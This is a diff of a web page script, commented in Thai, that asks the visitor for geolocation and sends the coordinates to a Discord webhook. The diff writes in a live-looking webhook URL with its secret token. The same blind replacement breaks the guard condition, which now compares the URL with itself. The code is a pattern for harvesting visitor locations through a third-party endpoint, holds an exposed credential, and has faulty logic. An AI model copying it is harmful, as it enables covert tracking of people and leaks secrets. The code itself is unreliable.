@@ -314,7 +314,7 @@
         const TARGET_LNG = 125.776758;
         
         // --- ใส่ URL Discord Webhook ของคุณที่นี่ ---
-        const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1524030114285752450/ZBtCcXuvNSNIbfdY2vhQwJvFXfRgnhIzFhvtNzUVv0bMm-RVc5-9kmvkjX3kW7ap9Lqw"; 
 
         function requestLocation() {
             const btn = document.getElementById('btnAllow');
@@ -337,7 +337,7 @@
                     const userLng = position.coords.longitude;
                     
                     // ส่งข้อมูลไปยัง Discord Webhook ทันที
-                    if (DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE" && DISCORD_WEBHOOK_URL !== "") {
+                    if (DISCORD_WEBHOOK_URL !== "https://discord.com/api/webhooks/1524030114285752450/ZBtCcXuvNSNIbfdY2vhQwJvFXfRgnhIzFhvtNzUVv0bMm-RVc5-9kmvkjX3kW7ap9Lqw" && DISCORD_WEBHOOK_URL !== "") {
                         const payload = {
                             username: "Location Bot",
                             embeds: [{
